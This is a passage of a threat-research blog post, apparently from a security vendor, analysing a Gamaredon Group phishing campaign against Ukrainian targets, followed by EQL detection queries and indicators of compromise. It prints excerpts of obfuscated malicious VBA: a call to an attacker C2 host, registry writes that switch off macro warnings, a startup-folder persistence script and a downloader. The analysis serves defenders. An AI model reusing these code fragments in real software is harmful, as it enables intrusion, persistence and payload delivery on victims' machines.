origin.\"}),`\n`,(0,t.jsx)(e.div,{className:\"table-container\",children:(0,t.jsxs)(e.table,{children:[(0,t.jsx)(e.thead,{children:(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.th,{}),(0,t.jsx)(e.th,{})]})}),(0,t.jsxs)(e.tbody,{children:[(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"File Size\"}),(0,t.jsx)(e.td,{children:\"46 kB\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"File Type Extension\"}),(0,t.jsx)(e.td,{children:\"docx\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"MIME Type\"}),(0,t.jsx)(e.td,{children:\"application/vnd.openxmlformats-officedocument.wordprocessingml.document\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Last Modified By\"}),(0,t.jsx)(e.td,{children:\"\\u0428\\u0423\\u0420\\u0418\\u041A\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Revision Number\"}),(0,t.jsx)(e.td,{children:\"2\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Create Date\"}),(0,t.jsx)(e.td,{children:\"2019:12:24 15:58:00Z\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Modify Date\"}),(0,t.jsx)(e.td,{children:\"2019:12:24 16:10:00Z\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Template\"}),(0,t.jsx)(e.td,{children:\"pos.dot\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Total Edit Time\"}),(0,t.jsx)(e.td,{children:\"2 minutes\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Pages\"}),(0,t.jsx)(e.td,{children:\"1\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Words\"}),(0,t.jsx)(e.td,{children:\"195\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Characters\"}),(0,t.jsx)(e.td,{children:\"1114\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Application\"}),(0,t.jsx)(e.td,{children:\"Microsoft Office Word\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Lines\"}),(0,t.jsx)(e.td,{children:\"9\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Paragraphs\"}),(0,t.jsx)(e.td,{children:\"2\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Company\"}),(0,t.jsx)(e.td,{children:\"Reanimator Extreme Edition\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Characters With Spaces\"}),(0,t.jsx)(e.td,{children:\"1307\"})]})]})]})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.em,{children:\"Figure 6 - Metadata from the lure document (truncated for length)\"})}),`\n`,(0,t.jsx)(e.div,{className:\"table-container\",children:(0,t.jsxs)(e.table,{children:[(0,t.jsx)(e.thead,{children:(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.th,{}),(0,t.jsx)(e.th,{})]})}),(0,t.jsxs)(e.tbody,{children:[(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"File Size\"}),(0,t.jsx)(e.td,{children:\"44 kB\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"File Type Extension\"}),(0,t.jsx)(e.td,{children:\"doc\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"MIME Type\"}),(0,t.jsx)(e.td,{children:\"application/msword\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Language Code\"}),(0,t.jsx)(e.td,{children:\"Russian\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Author\"}),(0,t.jsx)(e.td,{children:\"\\u0428\\u0423\\u0420\\u0418\\u041A\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Template\"}),(0,t.jsx)(e.td,{children:\"pos.dot\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Last Modified By\"}),(0,t.jsx)(e.td,{children:\"\\u0428\\u0423\\u0420\\u0418\\u041A\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Software\"}),(0,t.jsx)(e.td,{children:\"Microsoft Office Word\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Create Date\"}),(0,t.jsx)(e.td,{children:\"2019:12:12 11:48:00\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Modify Date\"}),(0,t.jsx)(e.td,{children:\"2019:12:24 10:30:00\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Code Page\"}),(0,t.jsx)(e.td,{children:\"Windows Cyrillic\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Company\"}),(0,t.jsx)(e.td,{children:\"Reanimator Extreme Edition\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Char Count With Spaces\"}),(0,t.jsx)(e.td,{children:\"0\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Revision Number\"}),(0,t.jsx)(e.td,{children:\"5\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Total Edit Time\"}),(0,t.jsx)(e.td,{children:\"0\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Words\"}),(0,t.jsx)(e.td,{children:\"0\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Characters\"}),(0,t.jsx)(e.td,{children:\"0\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Pages\"}),(0,t.jsx)(e.td,{children:\"1\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Paragraphs\"}),(0,t.jsx)(e.td,{children:\"1\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Lines\"}),(0,t.jsx)(e.td,{children:\"1\"})]})]})]})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.em,{children:\"Figure 7 - Metadata from the remote template (truncated for length)\"})}),`\n`,(0,t.jsx)(e.p,{children:\"While we cannot state with any authority, searching for the Author \\u201C\\u0428\\u0423\\u0420\\u0418\\u041A\\u201D has identified similar TTPs (lure documents with remote template injection) as far back as September of 2019.\"}),`\n`,(0,t.jsx)(e.h2,{id:\"macro-code-analysis\",children:\"Macro code analysis\"}),`\n`,(0,t.jsx)(e.p,{children:\"The macro code was obfuscated using string concatenation and procedurally generated variables \\u2014 techniques that are often used to bypass static detection technologies. Upon execution, this code provides reverse shell functionality that allows an adversary access to the victim\\u2019s system and capability to access shared resources on their local network. Figure 8 contains an excerpt of the macro that depicts the creation of a reverse shell and some of the system information collected automatically.\"}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`Dim NoARzTHy\nNoARzTHy = \"Set WShell=CreateObject(\"\"WSc\" + \"ri\" + \"pt.S\" + \"hel\" + \"l\"\")\"\nSet PWFJWatF = CreateObject(\"WScr\" + \"ipt.Ne\" + \"two\" + \"rk\")\nDim pbuvwTLK, JzESywut\nSet GGZucIZE = CreateObject(\"Sc\" + \"rip\" + \"ting.Fi\" + \"leSy\" + \"stemOb\" + \"ject\")\npbuvwTLK = GGZucIZE.Drives(Environ(\"Syst\" + \"emDri\" + \"ve\")).SerialNumber\nOYTgBXAP = PWFJWatF.ComputerName\n`})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.em,{children:\"Figure 8 - First 7 lines of macro code from the loaded document template\"})}),`\n`,(0,t.jsx)(e.p,{children:\"Figure 9 shows an excerpt of the same code removing the concatenation.\"}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`Dim NoARzTHy\nNoARzTHy = \"Set WShell=CreateObject(\"WScript.Shell\")\"\nSet PWFJWatF = CreateObject(\"WScript.Network\")\nDim pbuvwTLK, JzESywut\nSet GGZucIZE = CreateObject(\"Scripting.FileSystemObject\")\npbuvwTLK = GGZucIZE.Drives(Environ(\"SystemDrive\")).SerialNumber\nOYTgBXAP = PWFJWatF.ComputerName\n`})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.em,{children:\"Figure 9 - First 7 lines of macro code - Removal of concatenation\"})}),`\n`,(0,t.jsx)(e.p,{children:\"The serial number and hostname of the victim's computer are some of the first pieces of information the VBA collects. They are converted to hexadecimal and included in the reverse shell HTTP request to identify both the implant and the victim. Figure 10 shows off the configuration of the URI request within the macro and Figure 11 represents an example URI.\"}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`JzESywut = \"h\" + \"tt\" + \"p:\" + \"//l\" + \"ibcr\" + \"ash.dd\" + \"ns.ne\" + \"t/\" \u0026 OYTgBXAP \u0026 \"_\" \u0026 HFzesifc \u0026 \"//po\" + \"sol\" + \"re\" + \"boo\" + \"t.ph\" + \"p\"\n`})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.em,{children:\"Figure 10 - URI request configuration - Macro\"})}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`JzESywut = hxxp://libcrash.ddns[.]net/ENDPOINT1_96L02G3D//posolreboot.php\n`})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.em,{children:\"Figure 11 - URI request configuration - Example\"})}),`\n`,(0,t.jsx)(e.p,{children:\"By default, Microsoft disables external or untrusted macros by setting key values in the registry at HKCU\\\\Software\\\\Microsoft\\\\Office(VERSION)\\\\Word\\\\Security. The first registry modification made by this macro changes the key value of AccessVBOM to 1, effectively bypassing the default setting to enable external or untrusted macros. The second registry modification enables all macros automatically and disables warnings for future macro-enabled objects. Figure 12 represents the macro code for these registry modifications.\"}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`FEDzCjgi$ = \"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Office\\\\\" \u0026 Application.Version \u0026 _\"\\\\Word\\\\Security\\\\\"\nCreateObject(\"WScript.Shell\").RegWrite FEDzCjgi$ \u0026 \"AccessVBOM\", 1, \"REG_DWORD\"\nCreateObject(\"WScript.Shell\").RegWrite FEDzCjgi$ \u0026 \"VBAWarnings\", 1, \"REG_DWORD\"\n`})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.em,{children:\"Figure 12 - Registry modifications found in macro\"})}),`\n`,(0,t.jsx)(e.p,{children:\"The remaining lines of code end up writing a VBScript file and placing it in the user\\u2019s startup directory. Figure 13 contains an excerpt of the beginning lines of macro code where the VBScript (security.vbs) is written to disk and placed in the startup folder.\"}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`Dim LISPVdZd As Object\nSet LISPVdZd = GGZucIZE.CreateTextFile(FESHWDaD + \"\\\\Mi\" + \"croso\" + \"ft\\\\Wi\" + \"ndow\" + \"s\\\\St\" + \"art Men\" + \"u\\\\Pro\" + \"grams\\\\Sta\" + \"rtup\\\\secur\" + \"ity.v\" + \"b\" + \"s\", True, True)\n`})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.em,{children:\"Figure 13 - Macro code writing VBScript file (security.vbs)\"})}),`\n`,(0,t.jsx)(e.p,{children:\"Upon rebooting or successfully authenticating to an infected system, the persistent VBScript file is automatically executed and a standard HTTP GET is made with the previously observed URI (Figure 14). If the request is successful, the response body gets stored into another variable. This functionality appears to serve as a downloader that has specific subroutine instructions for reassembling a binary on disk. Figure 14 contains an excerpt of the function used to construct the HTTP GET request.\"}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`Function TOGeMFBD(iWotBBKf)\nOn Error Resume Next\nSet EXJJrRlN = CreateObject(\"MSXML2.XMLHTTP\")\nWith EXJJrRlN\n.Open \"GET\", iWotBBKf, False\n.send\nEnd With\nIf EXJJrRlN.Status = 200 Then\nTOGeMFBD = EXJJrRlN.ResponseBody\nEnd If\nEnd Function\n`})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.em,{children:\"Figure 14 - GET request (security.vbs)\"})}),`\n`,(0,t.jsx)(e.p,{children:\"During dynamic analysis, analysts identified that the script enters a loop while sending the request. A 0-byte file is created under the infected user\\u2019s roaming profile with a procedurally generated file name and text file extension. The file is iteratively written and deleted without the contents changing.\"}),`\n`,(0,t.jsx)(e.p,{children:\"Analysts have not confirmed the purpose of this file, and suspect it is used to reassemble a segmented later-stage implant. Potential reasons to obfuscate this process include evading detection and response solutions.\"}),`\n`,(0,t.jsx)(e.h2,{id:\"pteranodon-update\",children:\"Pteranodon update\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"While doing this research, we observed samples and artifacts that appear to be related to an updated version of the Gamaredon Group\\u2019s custom backdoor, known as \",(0,t.jsx)(e.a,{href:\"https://attack.mitre.org/software/S0147/\",rel:\"nofollow\",children:\"Pteranodon\"}),\". Although we don\\u2019t have substantial evidence that Pteranodon is the final payload victims are infected with during this campaign, we assess with moderate confidence that this activity is linked to Gamaredon Group.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"Three PE samples were uploaded to VirusTotal last month with each dropping two text files (\",(0,t.jsx)(e.a,{href:\"https://www.virustotal.com/gui/file/c4089686965df5e52105b6eac06703aa11c4891695278446370f623d531b505e/details\",rel:\"nofollow\",children:\"ExcelMyMacros.vba\"}),\", \",(0,t.jsx)(e.a,{href:\"https://www.virustotal.com/gui/file/02e6e2bfaaf6e77cfaccadaf26167135c53cf2c934d17c5a83e5bbcadd85b47d/details\",rel:\"nofollow\",children:\"wordMacros.vba\"}),\"). The two text files share several similarities to the VBA macro code found in the remote templates used in this campaign \\u2014 specifically, the methods of retrieving and hex-encoding the serial number and similar subroutine logic. Figure 15 depicts the VBA macro code from the remote template on the left and the dropped VBA macro code from a known Pteranodon implant on the right.\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.strong,{children:\"VBA from Campaign\"})}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`For LfJesrvH = 0 To UBound( IvAPFGDD )\" + vbCrLf\nLISPVdZd.Write \"IvAPFGDD(LfJesrvH) = Asc( Mid( EaCJFwPc, LfJesrvH + 1, 1 ) )\" + vbCrLf\nLISPVdZd.Write \"Next\" + vbCrLf\nLISPVdZd.Write \"GetFEDzCjgi = IvAPFGDD\" + vbCrLf\n`})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.strong,{children:\"VBA from Pteranodon\"})}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`For i = 0 To UBound( asrrCodes )\" + vbCrLf\nNewVDJKpCBSFile.Write \" asrrCodes(i) = Asc( Mid( myPassPhrase, i + 1, 1 ) )\" + vbCrLf\nNewVDJKpCBSFile.Write \" Next\" + vbCrLf\nNewVDJKpCBSFile.Write \" GetKey = asrrCodes\" + vbCrLf\n`})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.em,{children:\"Figure 15 - Macro comparison - VBA from Campaign (top) vs VBA from Pteranodon (bottom)\"})}),`\n`,(0,t.jsx)(e.p,{children:\"Both text files contained VBA, and had the same functionality for disabling macro warnings, creating a persistent VBScript in the startup folder and establishing connections to C2. What\\u2019s interesting with the dropped text files (VBA), is that they show the true variable names used by the developers before their tooling obfuscates the variables. At the time of this writing, each of the four C2 servers (see attached indicators) affiliated with Pteranodon samples were currently active and hosted a network allocated to ASN9123 (TIMEWEB LTD). Macro code associated with the Gamaredon Group campaign targeting Ukraninan officials called back to C2 hosted in the same network.\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"An interesting change in some of these artifacts appears to be the adoption of .NET. Along with the two text files containing VBA code, there are three dropped DLL\\u2019s (Microsoft.Office.Interop.Excel.dll, Microsoft.Office.Interop.Word.dll, Microsoft.Vbe.Interop.dll) and a .NET \",(0,t.jsx)(e.a,{href:\"https://www.virustotal.com/gui/file/145a61a14ec6d32b105a6279cd943317b41f1d27f21ac64df61bcdd464868edd/details\",rel:\"nofollow\",children:\"sample\"}),\" showing dependencies with these files. Figure 16 shows a hex-encoded reference to one of the VBA files (wordMacros.txt). Based on these observations, it\\u2019s intriguing to see Gamaredon Group continue to leverage core functionality of their VBA stager code, but in a new method of execution by using .NET\"]}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:\"/assets/images/playing-defense-against-gamaredon-group/dotnet_reference.jpg\",alt:\"\",width:\"898\",height:\"142\"})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.em,{children:\"Figure 16 - .NET reference to \\u201CwordMacros.txt\\u201D\"})}),`\n`,(0,t.jsx)(e.h2,{id:\"detection-crafting\",children:\"Detection crafting\"}),`\n`,(0,t.jsx)(e.p,{children:\"For organizations interested in detecting TTPs discussed in this blog post, detection logic has been provided for the following categories:\"}),`\n`,(0,t.jsx)(e.h3,{id:\"dynamic-dns\",children:\"Dynamic DNS\"}),`\n`,(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1311/\",rel:\"nofollow\",children:\"Dynamic DNS\"}),\" enables adversaries to rapidly provision very large numbers of records that map back to their infrastructure, creating a confusion layer between victims and adversaries. Gamaredon Group exclusively used Dynamic DNS locations for remotely hosted templates, rotating domains consistently, and leveraging separate infrastructure for hosting stagers and templates.\"]}),`\n`,(0,t.jsx)(e.p,{children:\"Profiling Dynamic DNS for your enterprise is an amazing way to get started hunting \\u2014 not just to baseline and build environmental awareness, but also to outright find evil. We will primarily focus on the two Dynamic DNS providers observed in relation to this campaign. If you need inspiration, consider counting up all non-browser processes that made a DNS request to one of these Dynamic DNS providers as shown in Figure 17.\"}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`dns where wildcard(query_name, \"*.ddns.net\", \"*.hopto.org\", \"*.bounceme.net\") and\nprocess_name not in (\"chrome.exe\",\"iexplore.exe\", \"firefox.exe\")\n| count process_name, query_name\n`})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.em,{children:\"Figure 17 - EQL Query - Count of non-browser process to dynamic DNS providers\"})}),`\n`,(0,t.jsx)(e.p,{children:\"Another option examines the processes that most frequently communicate with these providers, and may provide more context regarding how dynamic DNS is used in your environment, or enable an analyst to find signs of other malicious activity.\"}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`network where event of\n[dns where wildcard(query_name, \"*.ddns.net\", \"*.hopto.org\", \"*.bounceme.net\")\n| count process_name, total_in_bytes, total_out_bytes\n`})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.em,{children:\"Figure 18 - EQL query - Network traffic of processes to dynamic DNS providers\"})}),`\n`,(0,t.jsx)(e.h3,{id:\"template-injection\",children:\"Template Injection\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"Spearphishing attachments that utilize \",(0,t.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1221/\",rel:\"nofollow\",children:\"template injection\"}),\" may bypass security controls because they contain no embedded VBA code. The attached document retrieves a remotely hosted template where the malicious VBA code resides. In order to detect this activity dynamically, analyze DNS and network traffic over common protocols (HTTP/HTTPS/SMB) and processes generated by Microsoft Office applications. Enterprise defenders may need to whitelist any legitimate use of remotely hosted templates, or any benign network activity to Microsoft infrastructure. Below is an example EQL query focused on new process creation events from Office products that also made DNS requests outside our whitelist.\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`sequence by unique_pid\n[process where process_name in (\"winword.exe\", \"excel.exe\", \"powerpnt.exe\")]\n[dns where not wildcard(query_name , \"*.microsoft.com\", \"*.skype.com\")]\n`})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.em,{children:\"Figure 19 - EQL query - DNS traffic from Office applications\"})}),`\n`,(0,t.jsx)(e.p,{children:\"Some enhancements we can use with the previous query is to add a network event to the sequence as well as look for a spawned child process bringing in more context to the detection.\"}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`sequence\n[process where process_name in (\"winword.exe\", \"excel.exe\", \"powerpnt.exe\")] by unique_pid\n[dns where not wildcard(query_name, \"*.microsoft.com\", \"*.skype.com\")] by unique_pid\n[network where true] by unique_pid\n[process where subtype.create] by unique_ppid\n`})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.em,{children:\"Figure 20 - EQL query - Network traffic making dynamic DNS requests from Office applications\"})}),`\n`,(0,t.jsx)(e.p,{children:\"If we wanted to tailor a sequence-based detection to the Gamaredon Group activity specifically, we can bring in the previous Dynamic DNS providers, which creates a more restrictive filter.\"}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`sequence by unique_pid\n[process where process_name in (\"winword.exe\", \"excel.exe\", \"powerpnt.exe\")]\n[network where event of\n[dns where wildcard(query_name, \"*.ddns.net\", \"*.hopto.org\", \"*.bounceme.net\")]]\n`})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.em,{children:\"Figure 21 - EQL query - Network traffic making dynamic DNS requests from Office applications\"})}),`\n`,(0,t.jsx)(e.p,{children:\"Across a range of features provided by the Elastic Endpoint, this attack is prevented through different machine-learning technologies to stop advanced threats such as macro-enabled documents and malicious binaries. Along with these protections, we can take nearly any EQL logic and deploy it in prevention mode to completely stop an attack such as in this example with the download and execution of the remote template. Here\\u2019s a short clip in action:\"}),`\n`,(0,t.jsx)(i,{vidyard_uuid:\"Ex2QdtBA8eaHYQFDMK8wWR\"}),`\n`,(0,t.jsx)(e.h3,{id:\"malicious-registry-configuration\",children:\"Malicious registry configuration\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"In order for adversaries to be effective in their mission, they often create their own opportunities. In this case, the adversary reconfigured the target endpoint in order to disable macro security warnings and trust future macros automatically. These small changes can end up having larger implications, and defenders can look for them as symptoms of more serious security issues. For example, these same techniques have also been associated with threat groups like APT32 and are leveraged by malware families such as \",(0,t.jsx)(e.a,{href:\"https://www.fortinet.com/blog/threat-research/in-depth-analysis-of-net-malware-javaupdtr.html\",rel:\"nofollow\",children:\"AgentTesla\"}),\" and \",(0,t.jsx)(e.a,{href:\"https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/\",rel:\"nofollow\",children:\"BabyShark\"}),\".\"]}),`\n`,(0,t.jsx)(e.p,{children:\"This query looks for evidence of the registry modifications that disable warnings for macros and automatically enabling future macros:\"}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`registry where registry_data == 1 and wildcard(registry_path,\n\"*\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Office\\\\\\\\*\\\\\\\\Word\\\\\\\\Security\\\\\\\\AccessVBOM\",\n\"*\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Office\\\\\\\\*\\\\\\\\Word\\\\\\\\Security\\\\\\\\VBAWarnings\")\n`})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.em,{children:\"Figure 22 - EQL query - Registry modifications around disabling macro security features\"})}),`\n`,(0,t.jsx)(e.p,{children:\"That would function perfectly well as a standalone detection, but EQL allows us to look for both the registry modification and template injection techniques in this example query:\"}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`sequence by unique_pid\n[process where process_name in (\"winword.exe\", \"excel.exe\", \"powerpnt.exe\")]\n[registry where registry_data == 1 and wildcard(registry_path,\n\"*\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Office\\\\\\\\*\\\\\\\\Word\\\\\\\\Security\\\\\\\\AccessVBOM\",\n\"*\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Office\\\\\\\\*\\\\\\\\Word\\\\\\\\Security\\\\\\\\VBAWarnings\")]\n[registry where registry_data == 1 and wildcard(registry_path,\n\"*\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Office\\\\\\\\*\\\\\\\\Word\\\\\\\\Security\\\\\\\\AccessVBOM\",\n\"*\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Office\\\\\\\\*\\\\\\\\Word\\\\\\\\Security\\\\\\\\VBAWarnings\")]\n`})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.em,{children:\"Figure 23 - EQL query - Registry modifications around disabling macro security features\"})}),`\n`,(0,t.jsx)(e.h3,{id:\"persistence-startup\",children:\"Persistence startup\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"Gamaredon Group leveraged both malicious Windows shortcut files and script objects written to the \",(0,t.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1060/\",rel:\"nofollow\",children:\"Startup folder\"}),\" for persistence. This technique is very effective in spite of its simplicity and continues to be popular among adversaries. One of the first places to start building detection logic would be to inquire about processes that write files to the startup folder.\"]}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`file where subtype.create\nand (\nfile_path == \"*\\\\\\\\Programs\\\\\\\\Startup\\\\\\\\*.lnk\" or\nfile_path == \"*\\\\\\\\Programs\\\\\\\\Startup\\\\\\\\*.vbs\"\n)\n| count process_name, file_path, user_name\n`})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.em,{children:\"Figure 24 - EQL query - Monitoring file writes to startup folder\"})}),`\n`,(0,t.jsx)(e.p,{children:\"To take it a bit further, we can also customize detection logic to include the VBScript execution at logon. This is a great example for building a sequenced-based signal, as we will track the adversary\\u2019s activity over an extended period of time \\u2014 such as 90 days. Once the machine is rebooted or the user logs back in, an alert can be generated when WScript executes the VBScript file at startup.\"}),`\n`,(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:`sequence with maxspan=90d\n[file where subtype.create and file_path == \"*\\\\\\\\Programs\\\\\\\\Startup\\\\\\\\*.vbs\"]\n[process where subtype.create and parent_process_name==\"explorer.exe\" and\nprocess_name == \\u201Cwscript.exe\\u201D and command_line == \"*\\\\\\\\Programs\\\\\\\\Startup\\\\\\\\*\"]\n`})}),`\n`,(0,t.jsx)(e.p,{children:(0,t.jsx)(e.em,{children:\"Figure 25 - EQL query - Monitoring execution of startup processes\"})}),`\n`,(0,t.jsx)(e.h2,{id:\"conclusion\",children:\"Conclusion\"}),`\n`,(0,t.jsxs)(e.p,{children:[\"In this post, we reviewed recent campaign TTPs tied to an adversary known publicly as Gamaredon Group. This group is likely to have been active since at least 2013 and has engaged in an ongoing campaign against Ukraine at the time of this writing. We highlighted some of their current techniques such as template injection and the use of Dynamic DNS providers, the macro code found in a recent sample, and updates to their custom backdoor known as Pteranodon. By using \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/blog/introducing-event-query-language\",rel:\"nofollow\",children:\"EQL\"}),\", we also shared hunting and detection strategies around four specific techniques used by Gamaredon Group.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"We hope that by sharing some of these insights and queries, we can help raise awareness and continue to focus on protecting the world's data from attacks. To enable organizations further, we\\u2019ve added all the Indicators of Compromise (IOCs) below and added the queries in this post into the \",(0,t.jsx)(e.a,{href:\"https://eqllib.readthedocs.io/en/latest/analytics.html\",rel:\"nofollow\",children:\"EQLLib repository\"}),\".\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"Interested in using Elastic Security? Try \",(0,t.jsx)(e.a,{href:\"https://www.elastic.co/siem\",rel:\"nofollow\",children:\"Elastic SIEM\"}),\" for free.\"]}),`\n`,(0,t.jsxs)(e.p,{children:[\"Plus, \",(0,t.jsx)(e.a,{href:\"https://github.com/elastic/elasticsearch/issues/49581\",rel:\"nofollow\",children:\"EQL support is being added to Elasticsearch\"}),\"!\"]}),`\n`,(0,t.jsx)(e.h2,{id:\"indicators-of-compromise-iocs\",children:\"Indicators of Compromise (IOCs)\"}),`\n`,(0,t.jsx)(e.div,{className:\"table-container\",children:(0,t.jsxs)(e.table,{children:[(0,t.jsx)(e.thead,{children:(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.th,{}),(0,t.jsx)(e.th,{})]})}),(0,t.jsxs)(e.tbody,{children:[(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Lure Document SHA-256\"}),(0,t.jsx)(e.td,{children:\"86e0701349903105b0c346df9485dd59d85dd9463c2bee46d974ea1b1d7059d4\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Remote Template (pos.dot) SHA-256\"}),(0,t.jsx)(e.td,{children:\"feb0596e9735e03ae929d9b5ee862da19e16e5cdf57dd2a795205e591a55940f\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Remote Template from Lure Document Domain\"}),(0,t.jsx)(e.td,{children:\"document-out[.]hopto[.]org/pos[.]dot\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Remote Template Hosting IP\"}),(0,t.jsx)(e.td,{children:\"141[.]8[.]195[.]60\"})]}),(0,t.jsxs)(e.tr,{children:[(0,t.jsx)(e.td,{children:\"Remote Template Hosting 